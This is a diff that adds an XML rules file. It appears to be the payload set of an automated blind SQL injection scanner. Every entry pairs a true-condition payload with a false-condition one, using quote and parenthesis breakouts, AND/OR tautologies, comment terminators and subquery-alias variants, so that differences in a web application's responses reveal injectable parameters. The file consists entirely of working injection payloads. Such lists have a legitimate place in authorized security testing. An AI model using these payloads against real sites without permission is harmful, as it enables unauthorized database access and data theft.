@@ -1,0 +1,141 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <compare>
+            <compare1>' AND 1221=1221 AND '1'='1</compare1>
+            <compare11>' AND 11=11 AND '1'='1</compare11>
+            <compare2>' AND 1221=1 AND '1'='1</compare2>
+            <compare22>' AND 11=1 AND '1'='1</compare22>
+        </compare>
+        <compare>
+            <compare1>" AND 1221=1221 AND "1"="1</compare1>
+            <compare11>" AND 11=11 AND "1"="1</compare11>
+            <compare2>" AND 1221=1 AND "1"="1</compare2>
+            <compare22>" AND 11=1 AND "1"="1</compare22>
+        </compare>
+        <compare>
+            <compare1> AND 1221=1221-- tasdf</compare1>
+            <compare11> AND 11=11-- tad</compare11>
+            <compare2> AND 1221=1-- tad</compare2>
+            <compare22> AND 11=1-- tad</compare22>
+        </compare>
+        <compare>
+            <compare1> AND 1221=1221%23</compare1>
+            <compare11> AND 11=11%23</compare11>
+            <compare2> AND 1221=1%23</compare2>
+            <compare22> AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1> AND 1221=1221</compare1>
+            <compare11> AND 11=11</compare11>
+            <compare2> AND 1221=1</compare2>
+            <compare22> AND 11=1</compare22>
+        </compare>
+        <compare>
+            <compare1>) AND 3524=3524 AND (2568=2568</compare1>
+            <compare11>) AND 11=11 AND (2568=2568</compare11>
+            <compare2>) AND 1221=1 AND (2568=2568</compare2>
+            <compare22>) AND 11=1 AND (2568=2568</compare22>
+        </compare>
+        <compare>
+            <compare1>%' AND 3534=5303 AND '%'='</compare1>
+            <compare11>%' AND 11=11 AND '%'='</compare11>
+            <compare2>%' AND 3534=1 AND '%'='</compare2>
+            <compare22>%' AND 11=1 AND '%'='</compare22>
+        </compare>
+        <compare>
+            <compare1> OR 7913=7913%23</compare1>
+            <compare11> OR 11=11%23</compare11>
+            <compare2> OR 7913=1%23</compare2>
+            <compare22> OR 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>' OR 7913=7913%23</compare1>
+            <compare11>' OR 11=11%23</compare11>
+            <compare2>' OR 7913=1%23</compare2>
+            <compare22>' OR 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>) OR 7913=7913%23</compare1>
+            <compare11>) OR 11=11%23</compare11>
+            <compare2>) OR 7913=1%23</compare2>
+            <compare22>) OR 11=1%23</compare22>
+        </compare>
+    </couple>
+    <couple id="2">
+        <compare>
+            <compare1>)) AND 4691=4691%23</compare1>
+            <compare11>)) AND 11=11%23</compare11>
+            <compare2>)) AND 4691=1%23</compare2>
+            <compare22>)) AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>")) AND 4691=4691%23</compare1>
+            <compare11>")) AND 11=11%23</compare11>
+            <compare2>")) AND 4691=1%23</compare2>
+            <compare22>")) AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>') AND 4691=4691%23</compare1>
+            <compare11>') AND 11=11%23</compare11>
+            <compare2>') AND 4691=1%23</compare2>
+            <compare22>') AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>%' AND 4691=4691%23</compare1>
+            <compare11>%' AND 11=11%23</compare11>
+            <compare2>%' AND 4691=1%23</compare2>
+            <compare22>%' AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>%" AND 4691=4691%23</compare1>
+            <compare11>%" AND 11=11%23</compare11>
+            <compare2>%" AND 4691=1%23</compare2>
+            <compare22>%" AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>')) AND 4691=4691%23</compare1>
+            <compare11>')) AND 11=11%23</compare11>
+            <compare2>')) AND 4691=1%23</compare2>
+            <compare22>')) AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>))) AND 4691=4691%23</compare1>
+            <compare11>))) AND 11=11%23</compare11>
+            <compare2>))) AND 4691=1%23</compare2>
+            <compare22>))) AND 11=1%23</compare22>
+        </compare>
+    </couple>
+    <couple id="3">
+        <compare>
+            <compare1>')) AS cGQn WHERE 8783=8783 AND 5105=5105%23</compare1>
+            <compare11>')) AS cGQn WHERE 8783=8783 AND 11=11%23</compare11>
+            <compare2>')) AS cGQn WHERE 8783=8783 AND 5105=1%23</compare2>
+            <compare22>')) AS cGQn WHERE 8783=8783 AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>') AS cGQn WHERE 8783=8783 AND 5105=5105%23</compare1>
+            <compare11>') AS cGQn WHERE 8783=8783 AND 11=11%23</compare11>
+            <compare2>') AS cGQn WHERE 8783=8783 AND 5105=1%23</compare2>
+            <compare22>') AS cGQn WHERE 8783=8783 AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>") AS cGQn WHERE 8783=8783 AND 5105=5105%23</compare1>
+            <compare11>") AS cGQn WHERE 8783=8783 AND 11=11%23</compare11>
+            <compare2>") AS cGQn WHERE 8783=8783 AND 5105=1%23</compare2>
+            <compare22>") AS cGQn WHERE 8783=8783 AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>")) AS cGQn WHERE 8783=8783 AND 5105=5105%23</compare1>
+            <compare11>")) AS cGQn WHERE 8783=8783 AND 11=11%23</compare11>
+            <compare2>")) AS cGQn WHERE 8783=8783 AND 5105=1%23</compare2>
+            <compare22>")) AS cGQn WHERE 8783=8783 AND 11=1%23</compare22>
+        </compare>
+        <compare>
+            <compare1>`) AS cGQn WHERE 8783=8783 AND 5105=5105%23</compare1>
+            <compare11>`) AS cGQn WHERE 8783=8783 AND 11=11%23</compare11>
+            <compare2>`) AS cGQn WHERE 8783=8783 AND 5105=1%23</compare2>
+            <compare22>`) AS cGQn WHERE 8783=8783 AND 11=1%23</compare22>
+        </compare>
+    </couple>
+</rules>
